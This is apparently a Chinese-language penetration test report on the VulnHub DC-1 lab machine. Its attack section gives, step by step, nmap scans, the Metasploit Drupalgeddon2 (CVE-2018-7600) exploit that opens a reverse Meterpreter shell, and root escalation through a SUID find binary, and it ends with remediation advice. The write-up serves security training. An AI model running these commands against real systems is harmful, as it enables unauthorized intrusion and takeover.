# DC-1 渗透测试报告

**测试人员**：贺寿国
**测试日期**：2026年5月26日
**目标系统**：DC-1 (IP: 192.168.129.130)

## 1. 摘要

本次测试针对 VulnHub DC-1 靶机进行渗透，成功获取系统 root 权限并读取最终 flag。主要利用路径为：端口扫描发现 Web 服务 → 识别 Drupal 7 CMS → 利用 Drupalgeddon2 漏洞获得初始 shell → 信息收集发现 SUID 程序 → 利用 /usr/bin/find 提权至 root → 获取 flag。靶机存在 CMS 未及时更新、SUID 权限配置不当等风险。

## 2. 测试范围

- **IP 地址**：192.168.129.130
- **开放端口**：22 (SSH)、80 (HTTP)
- **目标系统**：Debian GNU/Linux 7 (wheezy)，Drupal 7 CMS

## 3. 测试方法与工具

- **信息收集**：nmap, arp-scan
- **Web 应用识别**：whatweb, 浏览器开发者工具
- **漏洞利用**：Metasploit Framework (drupal_drupalgeddon2)
- **Shell 操作**：python pty 交互式 shell
- **提权利用**：find 命令 SUID 逃逸

## 4. 漏洞发现与利用详情

### 4.1 端口扫描与服务识别

**操作**：

bash

```
nmap -sn 192.168.129.0/24     # 发现靶机 IP
nmap -sV -p- 192.168.129.130  # 全端口扫描
nmap -sV -p 22,80 192.168.129.130  # 服务版本探测
```



**结果**：

- 22/tcp open ssh OpenSSH 6.0p1 Debian 4+deb7u7
- 80/tcp open http Apache httpd 2.2.22 (Debian)

**截图**：

![image-20260526202213657](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526202213657.png)

### 4.2 Web 服务识别与 CMS 指纹

访问 `http://192.168.129.130`，查看页面源代码：

html

```
<meta name="Generator" content="Drupal 7 (http://drupal.org)">
```



确认 CMS 为 **Drupal 7**。

**截图**：

![image-20260526203324806](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526203324806.png)







**分析**：Drupal 7 存在多个高危漏洞，其中 Drupalgeddon2 (CVE-2018-7600) 允许未授权远程代码执行，是最佳突破口。

### 4.3 漏洞利用——Drupalgeddon2

使用 Metasploit 框架加载漏洞模块：

bash

```
msfconsole
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.129.130
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 80
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run
```



**执行结果**：

text

```
[*] Started reverse TCP handler on 192.168.129.129:4444
[*] Sending stage (42137 bytes) to 192.168.129.130
[*] Meterpreter session 1 opened (192.168.129.129:4444 -> 192.168.129.130:42875)
```



获得 Meterpreter 会话后进入系统 shell：

bash

```
meterpreter > shell
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@DC-1:/var/www$ whoami
www-data
```



**截图**：

![image-20260526212737818](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212737818.png)

### 4.4 信息收集与 SUID 枚举

在 `www-data` 权限下进行信息收集：

bash

```
www-data@DC-1:/var/www$ whoami
www-data
www-data@DC-1:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@DC-1:/var/www$ uname -a
Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
www-data@DC-1:/var/www$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 7 (wheezy)"
```

截图：

![image-20260526212855325](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212855325.png)

查找 SUID 文件：

bash

```
www-data@DC-1:/var/www$ find / -perm -4000 -type f 2>/dev/null
```

**关键输出**：

text

```
/usr/bin/find
/usr/bin/procmail
/usr/sbin/exim4
/bin/mount
/bin/ping
/bin/su
...
```



**分析**：`/usr/bin/find` 具有 SUID 权限，可在 GTFOBins 中找到利用方法。

### 4.5 利用 SUID find 提权至 root

bash

```
www-data@DC-1:/var/www$ cd /tmp
www-data@DC-1:/tmp$ find . -exec /bin/sh \; -quit
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```



**截图**：

![image-20260526212932376](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526212932376.png)

**原理**：`find` 命令被设置了 SUID 权限，其 `-exec` 参数会以文件所有者（root）的权限执行指定的命令，从而允许低权限用户生成 root shell。

### 4.6 获取最终 flag

bash

```
# find / -name "flag*.txt" -type f 2>/dev/null
/var/www/flag1.txt
/home/flag4/flag4.txt
/root/thefinalflag.txt
```



bash

```
# cat /root/thefinalflag.txt
```



**截图**：

![image-20260526213120893](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260526213120893.png)

## 5. 风险评级与修复建议

| 漏洞点                         | 风险等级 | 修复建议                                                     |
| :----------------------------- | :------- | :----------------------------------------------------------- |
| Drupal 7 未及时更新            | 严重     | 立即升级 Drupal 至最新安全版本，Drupal 7 已停止官方支持，建议迁移至 Drupal 9/10 |
| `/usr/bin/find` 具有 SUID 权限 | 高       | 审计所有 SUID 程序，移除非必需程序的 SUID 权限。`find` 不应具备 SUID 权限 |
| 配置文件 `settings.php` 可读   | 中       | 限制配置文件权限为 440，确保 Web 进程无法直接读取敏感凭据    |
| 数据库凭据明文存储             | 中       | 使用环境变量存储敏感配置，避免硬编码在文件中                 |
| 内核版本过旧 (3.2.0)           | 中       | 制定系统补丁管理策略，及时更新内核与安全补丁                 |

## 6. 结论

DC-1 靶机存在多个典型安全配置缺陷，攻击者可通过组合漏洞（CMS 未更新 + SUID 权限滥用）获得完整系统控制权。本次测试验证了从 Web 漏洞入手，逐步提权至 root 的完整渗透路径。建议按照上表进行修复，重点优先升级 CMS 系统和审计 SUID 权限配置。